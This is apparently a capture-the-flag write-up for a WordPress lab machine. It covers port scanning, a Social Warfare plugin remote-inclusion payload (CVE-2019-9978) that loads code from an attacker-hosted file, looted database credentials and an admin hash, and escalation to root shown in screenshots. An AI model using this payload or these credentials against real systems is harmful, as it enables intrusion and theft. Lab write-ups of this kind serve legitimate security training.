![image](https://user-images.githubusercontent.com/68326057/117396228-26808e80-af17-11eb-864e-04f68f046f55.png)

# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMeW+2AyVvlr6ePuYubrIG/bVmu/K0Ids1BYbag6YJINa5mbbPE2ATbqsOnKaBhyRSDCpRr7vdn+jAUhuLhf2VogMckwyBgd5/RLDaBTLrvQwE5KidaCHrPElMcuidzcBCoAmK41o/H/w1zdBpM5Fh8ySMr7WMNCDMON00sKoPecMVxWIxzXmfZXBvSdsSk2zJAP6ds+JGduvsFFCGuoIY4A3tLGW1ZQlALkZIt143KvkQrg4rXRjgVbSvryh6a5GJskvGA3QNpUiebqMHC1zXMrjfBoi/SX944LQ0hVLfuXTriH5QkzRhLxkN+K+lvkrGN5RzAqF3IhGIfJcEp7f1
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNe7JLcAbKYhJdELk+ajEn9c68tE7GIr28etvuPibQZZIMFLwM/+Zso6zsYbUOptgjA0+y6YP1geoSoy8CQse9U=
|   256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKZdajYQt+tMB0kowHtm64fUkzCdJbSS1dYaS/bWQrWJ

80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

## Wordpress

```bash
Users:-
admin
```

Plugins:-

![image](https://user-images.githubusercontent.com/68326057/117396723-3351b200-af18-11eb-964f-0cb7a563f197.png)


![image](https://user-images.githubusercontent.com/68326057/117396770-4b293600-af18-11eb-9625-e4ee7329ea3b.png)

--> https://unit42.paloaltonetworks.com/exploits-in-the-wild-for-wordpress-social-warfare-plugin-cve-2019-9978/

Payload:-

```bash
http://192.168.199.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.199:8000/payload.txt
```

![image](https://user-images.githubusercontent.com/68326057/117397479-e242bd80-af19-11eb-8e0a-5d0fe894707d.png)

![image](https://user-images.githubusercontent.com/68326057/117397520-f8507e00-af19-11eb-8869-f81ca639f7c7.png)


# user -wwwdata

![image](https://user-images.githubusercontent.com/68326057/117397690-54b39d80-af1a-11eb-8833-0bf0a67b2b60.png)


![image](https://user-images.githubusercontent.com/68326057/117397708-5bdaab80-af1a-11eb-862f-34f3c326401b.png)


## WPCONFIG.php

```php
/** MySQL database username */                                                                                                         
define( 'DB_USER', 'wp_user' );                                                                                                        
                                                                                                                                       
/** MySQL database password */                                                                                                         
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );                                                                                           
wp_user:R3&]vzhHmMn9,:-5                                                                                                                                       
```

## USERS

![image](https://user-images.githubusercontent.com/68326057/117397855-b3791700-af1a-11eb-856b-16c9e75e0eaf.png)

![image](https://user-images.githubusercontent.com/68326057/117398171-69446580-af1b-11eb-89a3-def5a6b11907.png)

```bash
ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status    display_name
1       admin   $P$BoIPbgc5i8WpBP2HzqoeQW3jfRVAyU1      admin   unknown@uknown.1337     http://192.168.199.123/wordpress        2020-08-17 23:26:45            0       admin

```

# user -takis

![image](https://user-images.githubusercontent.com/68326057/117398599-4b2b3500-af1c-11eb-98e3-afe4d3d2034b.png)


![image](https://user-images.githubusercontent.com/68326057/117398626-5b431480-af1c-11eb-83f8-1e8fde49ecef.png)


# root

![image](https://user-images.githubusercontent.com/68326057/117398652-68600380-af1c-11eb-89f3-1e013c1b0289.png)

![image](https://user-images.githubusercontent.com/68326057/117398811-b70d9d80-af1c-11eb-9fe9-8b2519d757cf.png)
